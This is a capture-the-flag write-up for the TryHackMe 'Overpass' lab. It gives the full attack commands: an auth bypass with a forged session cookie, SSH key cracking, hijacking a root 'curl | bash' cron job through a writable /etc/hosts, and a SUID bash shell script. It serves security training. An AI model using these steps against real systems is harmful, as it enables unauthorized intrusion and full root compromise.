# TryHackMe – Overpass

Difficulty: Easy
Target: 10.67.139.220
Attack Box: 192.168.176.64

# Scope

The objective of this room was to:

Obtain the user flag from user.txt

Escalate privileges and obtain the root flag from root.txt

The challenge simulates a self-developed password manager created by computer science students. The attack path includes web enumeration, authentication bypass, SSH access via cracked key, and privilege escalation via a misconfigured root cron job.

## Phase 1 – Initial Enumeration

A standard service scan was performed:

nmap -sC -sV -Pn 10.67.139.220


Open ports identified:

22/tcp – OpenSSH 8.2p1

80/tcp – Golang net/http server

The attack surface was clearly limited to SSH and a web application.

## Phase 2 – Web Enumeration

Directory brute forcing was conducted:

gobuster dir -u http://10.67.139.220 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x txt,zip,tar,gz,go,js,bak,old -t 40


Interesting findings:

/admin/

/downloads/

login.js

cookie.js

The JavaScript file login.js revealed:

Authentication is performed via POST request to /api/login

On success, the server returns a token

The client sets SessionToken cookie and redirects to /admin

Testing revealed that /admin/ did not validate the token properly. Any arbitrary cookie allowed access.

Example:

curl -i http://10.67.139.220/admin/ \
  -H "Cookie: SessionToken=test"


This returned the administrator page.

## Phase 3 – SSH Key Extraction

The admin page contained an encrypted RSA private key with a note addressed to “James”.

The key was copied locally and prepared for cracking:

ssh2john id_rsa_overpass > id_rsa_overpass.john
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_overpass.john
john --show id_rsa_overpass.john


After recovering the passphrase, SSH access was obtained:

ssh -i id_rsa_overpass james@10.67.139.220


User flag was located in:

/home/james/user.txt

## Phase 4 – Privilege Escalation
4.1 Enumeration

SUID binaries were checked:

find / -perm -4000 -type f 2>/dev/null


No custom or vulnerable SUID binaries were found.

Cron jobs were inspected:

cat /etc/crontab


A critical entry was discovered:

* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash


This means:

Every minute

Executed as root

Fetches a script via curl

Pipes directly into bash

Uses hostname overpass.thm

This is a remote code execution opportunity.

## Phase 5 – Hostname Hijacking

The file /etc/hosts was found to be world-writable:

ls -l /etc/hosts


A malicious entry was inserted:

192.168.176.64 overpass.thm


The local attacker machine hosted a malicious script:

Directory structure:

overpass/
└── downloads/
    └── src/
        └── buildscript.sh


Malicious script:

#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash


Python HTTP server started on attacker machine:

sudo python3 -m http.server 80


After correcting /etc/hosts so that overpass.thm resolved only to the attacker IP, the cron job fetched the malicious script.

Verification:

ls -l /tmp/rootbash


SUID bit was set.

## Phase 6 – Root Access

Privilege escalation was completed:

/tmp/rootbash -p
whoami


Effective UID became root.

Root flag was located in:

/root/root.txt

## Attack Chain Summary

Service enumeration (nmap)

Web directory discovery (gobuster)

Authentication bypass via insecure cookie handling

Extraction of encrypted SSH key

Password cracking (john)

SSH access as user

Discovery of root cron job executing remote script

Hostname hijack via writable /etc/hosts

Malicious script execution as root

SUID shell → full root compromise

## Key Lessons

Client-side authentication logic does not imply server-side validation.

Any curl | bash construct in a root cron job is critical.

Writable /etc/hosts enables DNS hijacking without needing external DNS control.

SUID copies in /tmp are often more reliable than modifying system binaries.

Always verify name resolution order in /etc/hosts (first match wins).
